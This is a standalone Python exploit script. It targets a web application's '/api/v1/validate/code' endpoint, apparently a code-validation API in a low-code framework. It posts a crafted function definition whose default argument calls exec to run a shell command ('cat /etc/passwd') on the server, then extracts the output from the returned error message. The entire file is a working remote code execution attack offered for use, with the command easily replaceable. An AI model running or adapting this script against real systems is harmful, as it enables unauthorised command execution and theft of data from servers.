#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

def executePayload(url):
    url = url.rstrip('/')
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        })
    vulnerablePath = urljoin(url, '/api/v1/validate/code')
    payload = {
            "code": f"""
def run(cd=exec('raise Exception(__import__("subprocess").check_output("cat /etc/passwd", shell=True))')): pass
"""
    }
    try:
        response = sess.post(vulnerablePath, json=payload)
        if response.status_code == 200:
            try:
                data = response.json()
                error_msg = data.get("function", {}).get("errors", [""])[0]
                if error_msg.startswith("b'"):
                    print(error_msg[2:-1].encode().decode('unicode_escape').strip())
            except Exception as parse_err:
                print(f"[!] Error: {parse_err}")
        else:
            print(response.json())
    except requests.RequestException as req_err:
        print(f"[!] Request failed: {req_err}")

def main():
    executePayload(sys.argv[1])

if __name__ == "__main__":
    main()
